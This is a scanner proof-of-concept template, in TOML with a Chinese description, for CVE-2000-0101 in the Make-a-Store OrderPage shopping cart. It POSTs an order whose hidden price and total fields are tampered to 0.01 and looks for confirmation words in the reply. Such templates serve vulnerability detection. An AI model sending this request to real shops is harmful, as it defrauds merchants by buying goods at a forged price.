[info]
author = "AVE"
description = "检测 Make-a-Store OrderPage 购物车应用是否存在隐藏表单字段篡改漏洞。通过提交被篡改的隐藏字段（价格、数量等敏感购买信息），验证服务器是否未对客户端提交的关键交易数据进行服务端校验。"
id = "POC-AVE-2000-0085"
name = "CVE-2000-0101 PoC"
severity = "high"
tags = ["cve-2000-0101"]
vuln_id = [
    "CVE-2000-0101",
    "AVE-2000-0085",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/orderpage/process_order.cgi"
protocol = "http"

[poc.requests.body]
content = "product_id=1001&quantity=1&price=0.01&shipping=0.00&total=0.01&submit=1"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "order",
    "confirm",
    "success",
    "thank you",
]
